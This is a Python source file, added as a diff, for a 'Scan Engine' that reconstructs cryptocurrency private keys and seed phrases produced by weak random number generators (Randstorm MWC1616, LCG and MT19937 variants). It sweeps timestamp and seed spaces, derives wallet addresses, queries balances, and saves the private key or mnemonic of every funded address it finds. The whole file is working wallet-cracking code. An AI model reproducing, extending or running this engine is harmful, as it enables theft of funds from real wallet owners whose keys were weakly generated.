@@ -1,0 +1,532 @@
+"""Scan Engine (V5.1) — unified pipeline: RNG sims × constraints × fingerprinting × balances.
+
+Pipeline per candidate:
+
+    time window ──> RNG simulator ──> entropy buffer ──┬─> raw privkey (JSBN era)
+                  (MWC1616 / LCG / MT19937)            └─> BIP-39 mnemonic ──> seed
+                                                                        │
+                                            legacy path families  ──────┤
+                                     (electrum_v1, bitcoincore_old,     ▼
+                                      blockchain_info, multibit, ...)  addresses
+                                                                        │
+                                             bloom pre-screen ──────────▼
+                                                read-only balance check
+
+Design notes
+  * The Randstorm-era JSBN/BitcoinJS wallets consumed Math.random() bytes
+    directly as the 256-bit EC private key (`new BN(random)` reduced mod n),
+    so `mode="direct"` is the primary sweep; `mode="bip39"` covers wallets
+    that fed the same weak stream into a 16-byte entropy buffer.
+  * Vectorized lanes (numpy) generate thousands of independent MWC1616
+    states in lock-step; address derivation stays scalar (pure-python ecc).
+  * Everything is stoppable mid-scan; progress + hits are exposed for the
+    CLI and the browser GUI alike.
+"""
+from __future__ import annotations
+
+import dataclasses
+import threading
+import time
+from dataclasses import dataclass, field
+from typing import Dict, Iterable, List, Optional, Tuple
+
+import numpy as np
+
+import bip39
+import constraints as cons
+import fingerprint as fpmod
+import hd
+import lcg
+import mwc1616
+from balance import BalanceChecker
+
+
+class _FpFilter(cons.Constraint):
+    """Heuristic entropy fingerprint gate (bucket/parity) — LOSSY."""
+    def __init__(self, buckets, parity):
+        self.buckets = set(buckets) if buckets is not None else None
+        self.parity = parity
+
+    def accepts_entropy(self, entropy16: bytes) -> bool:
+        return fpmod.matches_fingerprint(entropy16, self.buckets, self.parity)
+
+    def describe(self) -> dict:
+        return {"type": "fp_filter", "buckets": sorted(self.buckets or []),
+                "parity": self.parity}
+
+
+# ---------------------------------------------------------------- findings
+@dataclass
+class Finding:
+    kind: str                   # "direct" | "bip39"
+    source: str                 # rng label e.g. "randstorm/mwc1616"
+    t_ms: int                   # wall-clock guess that seeded the RNG
+    priv_hex: str
+    chain_tag: str
+    address: str
+    style: str                  # path family / "direct"
+    path: str
+    compressed: bool
+    balance_sat: int
+    tx_count: int
+    backend: str
+    mnemonic: Optional[str] = None      # only when kind == "bip39"
+    found_at: float = field(default_factory=time.time)
+
+    def public_dict(self) -> dict:
+        """GUI-safe view — NEVER contains the private key or mnemonic."""
+        d = dataclasses.asdict(self)
+        d.pop("priv_hex", None)
+        d.pop("mnemonic", None)
+        return d
+
+
+# ------------------------------------------------------------------ config
+@dataclass
+class ScanConfig:
+    vuln: str = "randstorm"          # randstorm | lcg | mt19937
+    mode: str = "direct"             # direct | bip39   (what entropy feeds)
+    t_start_ms: int = 0              # inclusive, epoch ms
+    t_stop_ms: int = 0               # exclusive, epoch ms
+    stride_ms: int = 1               # sweep granularity for randstorm
+    lcg_variant: str = "java"        # java | msvc_mod | msvc_top | nr
+    lcg_seconds: bool = True         # seed = epoch SECONDS (LCG space small!)
+    coins: Tuple[str, ...] = ("btc",)
+    styles: Optional[Tuple[str, ...]] = None    # None => all legacy families
+    naddr: int = 1                   # receiving+change addresses per family
+    batch: int = 4096                # vectorized lanes per step
+    max_candidates: int = 0          # 0 => unlimited
+    stop_on_hit: bool = False
+    partial_words: Optional[Tuple[int, ...]] = None   # gap positions (BIP-39)
+    known_phrase: str = ""           # "w1 w2 ? w4 …" (?/* = missing word)
+    auto_fingerprint: bool = False   # classify sample & pick vuln/variant
+    fingerprint_sample_hex: str = ""  # observed weak-RNG bytes (classify input)
+    buckets: Optional[Tuple[int, ...]] = None   # REDUCED-coverage pre-filter
+    parity: Optional[int] = None                # REDUCED-coverage pre-filter
+    min_sat: int = 1                            # report threshold
+    mt_seed_lo: int = 0                         # mt19937: explicit seed range
+    mt_seed_hi: int = 0                         # (hi>lo overrides time window)
+
+    @staticmethod
+    def from_years(y0: int, y1: int, **kw) -> "ScanConfig":
+        a = int(time.mktime((y0, 1, 1, 0, 0, 0, 0, 0, -1)) * 1000)
+        b = int(time.mktime((y1, 1, 1, 0, 0, 0, 0, 0, -1)) * 1000)
+        return ScanConfig(t_start_ms=a, t_stop_ms=b, **kw)
+
+
+# ------------------------------------------------------------------- stats
+@dataclass
+class ScanStats:
+    started: float = 0.0            # wall-clock epoch of start()
+    elapsed: float = 0.0            # sweep WORK time (monotonic seconds)
+    probe_wait: float = 0.0         # network stall inside balance probes
+    candidates: int = 0
+    addresses_derived: int = 0
+    bloom_skips: int = 0
+    network_probes: int = 0
+    hits: int = 0
+    constraint_rejects: int = 0
+    reduced_coverage: bool = False
+    coverage_keeps: float = 1.0
+    finished: bool = False
+    stopped: bool = False
+    cursor_ms: int = 0              # last swept timestamp (randstorm/lcg)
+
+    def rate(self) -> float:
+        """Candidates/second over actual sweep compute time only.
+
+        V5.1.2 fix: in ``--balance public`` mode every network probe could
+        block up to its HTTP timeout (~10 s).  That wall-clock wait used to
+        land inside ``elapsed``, inflating the denominator so the displayed
+        rate collapsed to 0/s even though candidates were counted correctly.
+        Network/probe stall time is now tracked separately (``probe_wait``)
+        and excluded; ``elapsed`` stays pure sweep-compute time.
+        """
+        e = max(self.elapsed, 1e-9)
+        return self.candidates / e
+
+    def eta_s(self, cfg: ScanConfig) -> Optional[float]:
+        p = self.percent(cfg)
+        if p is None or not (0.0 < p < 1.0):
+            return None
+        return self.elapsed * (1 - p) / p
+
+    def percent(self, cfg: ScanConfig) -> Optional[float]:
+        """True fraction of the configured search space already swept."""
+        if cfg.vuln == "mt19937" and cfg.mt_seed_hi > cfg.mt_seed_lo:
+            span = cfg.mt_seed_hi - cfg.mt_seed_lo
+            done = self.cursor_ms - cfg.mt_seed_lo   # cursor carries seed
+        elif cfg.t_stop_ms > cfg.t_start_ms:
+            span = cfg.t_stop_ms - cfg.t_start_ms
+            done = self.cursor_ms - cfg.t_start_ms
+        else:
+            return None
+        if span <= 0:
+            return None
+        return min(max(done / span, 0.0), 1.0)
+
+
+# ------------------------------------------------------------------ engine
+class ScanEngine:
+    def __init__(self, cfg: ScanConfig, checker: BalanceChecker):
+        self.cfg = cfg
+        self.checker = checker
+        # --- V5.1: constraint solver wiring ------------------------------
+        parts: list[cons.Constraint] = []
+        if cfg.known_phrase.strip():
+            known, gaps = cons.parse_partial_phrase(cfg.known_phrase)
+            parts.append(cons.MissingWordConstraint(known, gaps))
+            cfg.partial_words = gaps or cfg.partial_words
+        if cfg.buckets is not None or cfg.parity is not None:
+            parts.append(_FpFilter(cfg.buckets, cfg.parity))
+        self.constraint = cons.CompositeConstraint(parts) if parts else None
+        # --- V5.1: fingerprint-driven auto-config ------------------------
+        self.fingerprint_report = None
+        if cfg.auto_fingerprint and cfg.fingerprint_sample_hex:
+            self.fingerprint_report = fpmod.classify_stream(
+                bytes.fromhex(cfg.fingerprint_sample_hex))
+            if self.fingerprint_report.best:
+                vuln, variant = fpmod.family_to_scan_args(
+                    self.fingerprint_report.best.family)
+                cfg.vuln = vuln
+                if variant:
+                    cfg.lcg_variant = variant
+        # --- V5.1: prune plan (honest coverage bookkeeping) --------------
+        self.prune_plan = fpmod.build_prune_plan(
+            cfg.vuln, cfg.mode, cfg.t_start_ms, cfg.t_stop_ms,
+            buckets=cfg.buckets, parity=cfg.parity)
+        self.stats_extra_note = ("REDUCED COVERAGE"
+                                 if not self.prune_plan.lossless else "")
+        self.findings: List[Finding] = []
+        self.stats = ScanStats()
+        self._stop = threading.Event()
+        self._thread: Optional[threading.Thread] = None
+        self._work_s = 0.0                      # accumulated sweep time
+        self._probe_s = 0.0                     # accumulated network stall
+        self._run_t0 = time.monotonic()         # set again in _run()
+        self._probe_wall = 0.0                  # monotonic t0 of active probe
+        self.on_hit = None                    # callback(Finding) — GUI hook
+        self.on_progress = None               # callback(ScanStats)
+
+    # -- control -----------------------------------------------------------
+    def start(self) -> None:
+        if self._thread and self._thread.is_alive():
+            raise RuntimeError("scan already running")
+        c = self.cfg
+        has_window = c.t_stop_ms > c.t_start_ms
+        has_seed_range = (c.vuln == "mt19937" and c.mt_seed_hi > c.mt_seed_lo)
+        # Constraint-guided lanes (e.g. known_phrase) enumerate the solver's
+        # own solution space — a time window is meaningless there (V5.1 fix:
+        # lane B of the selftest used to die with a bogus "empty window").
+        generating = (self.constraint is not None and
+                      any(p.generating for p in self.constraint.parts))
+        if not (has_window or has_seed_range or generating):
+            raise ValueError("empty window: set t_stop_ms > t_start_ms "
+                             "(or an explicit mt19937 seed range, "
+                             "or a generating constraint like --known-phrase)")
+        self._stop.clear()
+        self.stats = ScanStats(started=time.time())
+        self._thread = threading.Thread(target=self._run, daemon=True)
+        self._thread.start()
+
+    def stop(self) -> None:
+        self._stop.set()
+
+    @property
+    def running(self) -> bool:
+        return bool(self._thread and self._thread.is_alive())
+
+    def join(self, timeout: Optional[float] = None) -> None:
+        if self._thread:
+            self._thread.join(timeout)
+
+    # -- main loop ---------------------------------------------------------
+    def _run(self) -> None:
+        self._run_t0 = time.monotonic()         # fresh baseline (V5.1.2)
+        try:
+            self.stats.reduced_coverage = not self.prune_plan.lossless
+            self.stats.coverage_keeps = self.prune_plan.total_keeps
+            # Constraint-guided lane: when a GENERATING constraint exists
+            # (e.g. missing-word phrase), enumerate ITS solution space and
+            # probe each survivor — this is the search-space reduction:
+            # 2^128 entropy space collapses to ~128 checksum-valid candidates.
+            if self.constraint is not None and \
+                    any(p.generating for p in self.constraint.parts):
+                self._sweep_constrained()
+                self.stats.finished = not self.stats.stopped
+                return
+            if self.cfg.vuln == "randstorm":
+                self._sweep_randstorm()
+            elif self.cfg.vuln == "lcg":
+                self._sweep_lcg()
+            elif self.cfg.vuln == "mt19937":
+                self._sweep_mt()
+            else:
+                raise ValueError(f"unknown vuln {self.cfg.vuln!r}")
+            self.stats.finished = not self.stats.stopped
+        finally:
+            self._end_probe()                   # close any open probe window
+            self.stats.elapsed = (time.monotonic() - self._run_t0) - self._probe_s
+            self.stats.probe_wait = self._probe_s
+            # V5.1.2: park the cursor at the END of the space on a clean
+            # finish — percent() reads `cursor`, and a half-open range made
+            # completed scans report 98.4% forever.
+            if not self.stats.stopped:
+                c = self.cfg
+                if c.vuln == "mt19937" and c.mt_seed_hi > c.mt_seed_lo:
+                    self.stats.cursor_ms = c.mt_seed_hi
+                elif c.t_stop_ms > c.t_start_ms:
+                    self.stats.cursor_ms = c.t_stop_ms
+
+    def _begin_probe(self) -> None:
+        """Mark the start of a potentially-blocking balance check.
+
+        V5.1.2: network stall time is quarantined from the compute clock so
+        `rate()` never collapses to 0/s in --balance public mode.
+        """
+        if self._probe_wall == 0.0:
+            self._probe_wall = time.monotonic()
+
+    def _end_probe(self) -> None:
+        if self._probe_wall != 0.0:
+            self._probe_s += time.monotonic() - self._probe_wall
+            self._probe_wall = 0.0
+
+    def _progress(self, cursor: int) -> None:
+        """Report live stats at sweep boundaries (V5.1: was never called
+        mid-sweep, so status showed elapsed=0.0 and rate=0 forever)."""
+        self.stats.cursor_ms = cursor
+        # live compute time = wall since run start − accumulated probe stalls
+        # (− the currently-open probe window, if any).
+        stall = self._probe_s
+        if self._probe_wall != 0.0:
+            stall += time.monotonic() - self._probe_wall
+        self.stats.elapsed = max(
+            (time.monotonic() - self._run_t0) - stall, 1e-9)
+        self.stats.probe_wait = stall
+        if self.on_progress:
+            self.on_progress(self.stats)
+
+    def _budget_ok(self) -> bool:
+        c = self.cfg
+        if self._stop.is_set():
+            self.stats.stopped = True
+            return False
+        if c.max_candidates and self.stats.candidates >= c.max_candidates:
+            return False
+        return True
+
+    def _note_hit(self, f: Finding) -> None:
+        self.findings.append(f)
+        self.stats.hits += 1
+        if self.on_hit:
+            try:
+                self.on_hit(f)
+            except Exception:
+                pass
+
+    # -- constraint-guided sweep (missing words etc.) -----------------------
+    def _sweep_constrained(self) -> None:
+        c = self.cfg
+        for buf in self.constraint.generate():
+            if not self._budget_ok():
+                break
+            self.stats.candidates += 1
+            src = f"constraint/{c.vuln}"
+            if c.mode == "bip39":
+                self._probe_bip39(buf, 0, src)
+            else:
+                self._probe_direct(buf, 0, src)
+        self._progress(0)
+
+    def _fp_gate(self, buf: bytes) -> bool:
+        """Apply heuristic/fingerprint filters; count rejections."""
+        if self.constraint is None:
+            return True
+        if self.constraint.accepts_entropy(buf[:16]):
+            return True
+        self.stats.constraint_rejects += 1
+        return False
+
+    # -- Randstorm (V8 MWC1616) --------------------------------------------
+    def _sweep_randstorm(self) -> None:
+        c = self.cfg
+        # NOTE: default stride is 1 ms — a minute-sized stride would SKIP
+        # every millisecond timestamp in between and miss planted wallets.
+        lanes = max(c.batch, 1)
+        # Build lane seeds: consecutive ms timestamps mapped through the
+        # canonical time-seeding helper (see mwc1616.v8_seeds_from_time_ms).
+        t = c.t_start_ms
+        while t < c.t_stop_ms and self._budget_ok():
+            ts = [t + i * c.stride_ms for i in range(lanes)
+                  if t + i * c.stride_ms < c.t_stop_ms]
+            if not ts:
+                break
+            s1 = [v & 0xFFFFFFFF for v in ts]
+            s2 = [((v >> 32) ^ (v * 2654435761)) & 0xFFFFFFFF for v in ts]
+            batch = mwc1616.V8Batch(s1, s2)
+            # one chunk per lane -> 31 bits; need 256 bits => 9 chunks
+            words = np.stack([batch.step() for _ in range(9)], axis=1)
+            rows = self._words_to_buffers(words)
+            for lane_i, buf in enumerate(rows):
+                if not self._budget_ok():          # V5.1.1: honor max_candidates
+                    self._progress(ts[lane_i])     # mid-batch (was batch-only)
+                    return
+                if not self._fp_gate(buf):
+                    continue
+                self.stats.candidates += 1
+                tm = ts[lane_i]
+                if c.mode == "direct":
+                    self._probe_direct(buf, tm, "randstorm/mwc1616")
+                else:
+                    self._probe_bip39(buf, tm, "randstorm/mwc1616")
+            self._progress(ts[-1] + c.stride_ms)
+            t += lanes * c.stride_ms
+
+    @staticmethod
+    def _words_to_buffers(words: "np.ndarray") -> List[bytes]:
+        """(lanes, 9) uint32 chunks -> list of 32-byte big-endian buffers.
+
+        Concatenate 9×31-bit chunks = 279 bits, keep top 256 → JSBN-style
+        `new BN(bytes)` then reduced mod n by caller semantics.
+        """
+        out = []
+        for row in words.astype(np.uint64):
+            acc = 0
+            for w in row:
+                acc = (acc << 31) | int(w)
+            acc >>= (9 * 31 - 256)                     # trim to 256 bits
+            out.append(acc.to_bytes(32, "big"))
+        return out
+
+    # -- LCG sweeps ----------------------------------------------------------
+    def _sweep_lcg(self) -> None:
+        c = self.cfg
+        t0 = c.t_start_ms // 1000 if c.lcg_seconds else c.t_start_ms
+        t1 = c.t_stop_ms // 1000 if c.lcg_seconds else c.t_stop_ms
+        t = t0
+        while t < t1 and self._budget_ok():
+            for buf in lcg.time_seed_lcg(t, c.lcg_variant):
+                if not self._budget_ok():          # V5.1.1: mid-tick budget stop
+                    self._progress(t * (1000 if c.lcg_seconds else 1))
+                    return
+                if not self._fp_gate(buf):
+                    continue
+                self.stats.candidates += 1
+                src = f"lcg/{c.lcg_variant}"
+                if c.mode == "direct":
+                    self._probe_direct(buf, t * 1000, src)
+                else:
+                    self._probe_bip39(buf, t * 1000, src)
+            t += 1
+            if t % 3600 == 0:
+                self._progress(t * (1000 if c.lcg_seconds else 1))
+
+    # -- MT19937 sweeps -------------------------------------------------------
+    def _sweep_mt(self) -> None:
+        import fast_mt, mt19937
+        c = self.cfg
+        # V5.1.1 fix: seed ranges are never clamped to uint32 — a window like
+        # [0, 1000) must sweep exactly 1000 seeds, not a truncated subset.
+        use_time = not (c.mt_seed_hi > c.mt_seed_lo)
+        lo, hi = ((c.t_start_ms // 1000, c.t_stop_ms // 1000)
+                  if use_time else (c.mt_seed_lo, c.mt_seed_hi))
+        if hi < lo:
+            raise ValueError(f"empty seed range [{lo} .. {hi})")
+        CH = 8192                                   # vector lanes per chunk
+        # np.arange on int64 keeps every seed in [lo, hi) — no uint32 wrap.
+        seeds = np.arange(lo, hi, dtype=np.int64)
+        for i in range(0, len(seeds), CH):
+            if not self._budget_ok():
+                return
+            chunk = seeds[i:i + CH]
+            # historical vulnerable path: one rng() call PER BYTE (low byte of
+            # each tempered output). Vectorized engine is bit-identical to the
+            # scalar reference; fall back when numpy/cupy are absent.
+            # V5.1.1: MT init masks the seed to uint32 EXACTLY like C's
+            # `uint32_t s = seed` conversion — so we hand fast_mt the masked
+            # view but keep the true int64 seeds for cursor/stats semantics.
+            try:
+                bufs = fast_mt.batch_entropy_auto(
+                    chunk.astype(np.uint32), n_out=16)
+                rows = [bytes(bufs[j]) for j in range(bufs.shape[0])]
+            except RuntimeError:
+                rows = [mt19937.ref_entropy_buffer(int(s)) for s in chunk]
+            for j, buf in enumerate(rows):
+                if not self._budget_ok():
+                    self._progress(int(chunk[j]))   # cursor = last seed/sec
+                    return
+                if not self._fp_gate(buf):
+                    continue
+                self.stats.candidates += 1
+                sec = int(chunk[j])
+                t_ms = sec * 1000 if use_time else sec
+                src = "mt19937/std"
+                if c.mode == "direct":
+                    self._probe_direct(buf, t_ms, src)
+                else:
+                    self._probe_bip39(buf, t_ms, src)
+            self._progress(int(chunk[-1]))          # cursor = last seed/sec
+
+    def _mt_window_desc(self) -> str:
+        """Human-readable sweep window for mt19937 (V5.1.1 fix: the log line
+        used to print an empty time window whenever a seed range was given —
+        MT lane B is keyed by SEEDS, not wall-clock ms)."""
+        c = self.cfg
+        if c.mt_seed_hi > c.mt_seed_lo:
+            return f"seeds=[{c.mt_seed_lo} .. {c.mt_seed_hi})"
+        return (f"time-seeded=[{c.t_start_ms // 1000} .. "
+                f"{c.t_stop_ms // 1000}) s")
+
+    # -- probing --------------------------------------------------------------
+    def _probe_direct(self, entropy: bytes, t_ms: int, src: str) -> None:
+        """Raw-key era: JSBN took random bytes -> BN -> privkey (mod n)."""
+        import ecc
+        k = int.from_bytes(entropy, "big")
+        if k == 0:
+            return
+        k %= ecc.CURVE_ORDER
+        priv = k.to_bytes(32, "big")
+        keys = hd.direct_keys(priv, self.cfg.coins)
+        self._check_keys(keys, Finding(kind="direct", source=src, t_ms=t_ms,
+                                       priv_hex=priv.hex(), chain_tag="",
+                                       address="", style="direct", path="-",
+                                       compressed=True, balance_sat=0,
+                                       tx_count=0, backend=""))
+
+    def _probe_bip39(self, entropy: bytes, t_ms: int, src: str) -> None:
+        """Mnemonic era: first 16 bytes -> 12-word phrase -> legacy paths."""
+        keys = hd.derive_keys_from_entropy(entropy, self.cfg.coins,
+                                           self.cfg.styles, self.cfg.naddr)
+        base = Finding(kind="bip39", source=src, t_ms=t_ms, priv_hex="",
+                       chain_tag="", address="", style="", path="",
+                       compressed=True, balance_sat=0, tx_count=0, backend="",
+                       mnemonic=bip39.entropy_to_mnemonic(entropy[:16]))
+        self._check_keys(keys, base)
+
+    def _check_keys(self, keys: List[hd.DerivedKey], base: Finding) -> None:
+        self.stats.addresses_derived += len(keys)
+        pairs = [(k.chain_tag, k.address) for k in keys]
+        # V5.1.2: balance probes (esp. --balance public HTTP calls) are NOT
+        # sweep compute — quarantine their wall time from rate()/elapsed.
+        self._begin_probe()
+        try:
+            res_list = self.checker.check_many(pairs)
+        finally:
+            self._end_probe()
+        hit_addrs = {r.address: r for r in res_list}
+        for k in keys:
+            r = hit_addrs.get(k.address)
+            if r is None or r.confirmed + r.unconfirmed < self.cfg.min_sat:
+                continue
+            f = dataclasses.replace(base, chain_tag=k.chain_tag,
+                                    address=k.address, style=k.style,
+                                    path=k.path, compressed=k.compressed,
+                                    priv_hex=k.priv_hex or base.priv_hex,
+                                    balance_sat=r.confirmed,
+                                    tx_count=r.tx_count, backend=r.source)
+            self._note_hit(f)
+            if self.cfg.stop_on_hit:
+                self.stop()
+        self.stats.bloom_skips = self.checker.skipped_by_bloom
+        self.stats.network_probes = self.checker.probed
